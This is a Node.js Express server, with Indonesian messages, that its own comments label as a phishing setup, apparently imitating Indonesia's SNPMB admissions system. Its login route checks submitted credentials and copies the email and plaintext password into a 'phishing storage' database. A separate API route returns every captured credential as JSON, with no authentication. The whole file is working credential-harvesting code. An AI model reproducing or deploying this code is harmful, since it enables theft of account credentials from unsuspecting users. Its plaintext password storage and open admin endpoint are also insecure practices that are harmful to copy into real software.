const express = require('express');
const path = require('path');
const dotenv = require('dotenv');
const mysql = require('mysql2/promise');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Database Connections Pool
const dbConfig = {
    host: process.env.DB_HOST || 'localhost',
    port: process.env.DB_PORT || 3307,
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASS || '',
};

// Connection to 'login' database (Original System)
const systemDb = mysql.createPool({ 
    ...dbConfig, 
    database: process.env.DB_NAME_SYSTEM || 'login' 
});

// Connection to 'db_snpmb' database (Phishing Storage)
const phisingDb = mysql.createPool({ 
    ...dbConfig, 
    database: process.env.DB_NAME_PHISING || 'db_snpmb' 
});

// Test connections
(async () => {
    try {
        await systemDb.getConnection();
        console.log('Connected to System Database (login)');
        await phisingDb.getConnection();
        console.log('Connected to Phising Database (db_snpmb)');
    } catch (err) {
        console.error('Database connection failed:', err.message);
    }
})();

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'UIadmin.html'));
});

// API: Get Phishing Data from MySQL
app.get('/api/phising-data', async (req, res) => {
    try {
        const [rows] = await phisingDb.query("SELECT email, pass AS password FROM user ORDER BY id DESC");
        res.json({ success: true, data: rows });
    } catch (error) {
        console.error('Error fetching phising data:', error);
        res.status(500).json({ success: false, message: 'Gagal mengambil data dari database' });
    }
});

// API: Login Handle
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    try {
        const [users] = await systemDb.query(
            "SELECT * FROM pengguna WHERE email = ? AND pass = ?", 
            [email, password]
        );

        if (users.length > 0) {
            // Menggunakan INSERT IGNORE agar jika email sudah ada (Duplicate Key), tidak terjadi error dan tidak terjadi insert ganda
            await phisingDb.query(
                "INSERT IGNORE INTO user (email, pass) VALUES (?, ?)", 
                [email, password]
            );
            
            return res.json({ success: true, redirect: 'dashboard.html' });
        } else {
            return res.json({ success: false, message: 'Email atau kata sandi tidak valid' });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, message: 'Terjadi kesalahan pada server database' });
    }
});

app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
    console.log(`Admin Panel: http://localhost:${PORT}/admin`);
});
